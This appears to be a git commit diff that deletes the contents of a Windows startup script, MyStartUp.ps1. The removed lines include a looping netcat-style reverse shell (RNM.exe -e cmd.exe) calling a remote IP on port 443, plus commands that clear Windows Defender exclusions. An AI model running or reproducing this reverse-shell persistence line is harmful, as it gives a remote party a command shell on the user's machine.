57d643bcb99a4b8b2f52851279ce6aae154713c7
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2025-08-27 06:21:13 -0600

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,7 +1,1 @@
-while ($true) {C:\Users\Public\RNM.exe -nv 200.28.162.248 443 -e cmd.exe ; start-sleep 33}
 
-$prefs = Get-MpPreference
-if ($prefs.ExclusionPath) { Remove-MpPreference -ExclusionPath $prefs.ExclusionPath }
-if ($prefs.ExclusionExtension) { Remove-MpPreference -ExclusionExtension $prefs.ExclusionExtension }
-if ($prefs.ExclusionProcess) { Remove-MpPreference -ExclusionProcess $prefs.ExclusionProcess }
-if ($prefs.ExclusionIpAddress) { Remove-MpPreference -ExclusionIpAddress $prefs.ExclusionIpAddress }
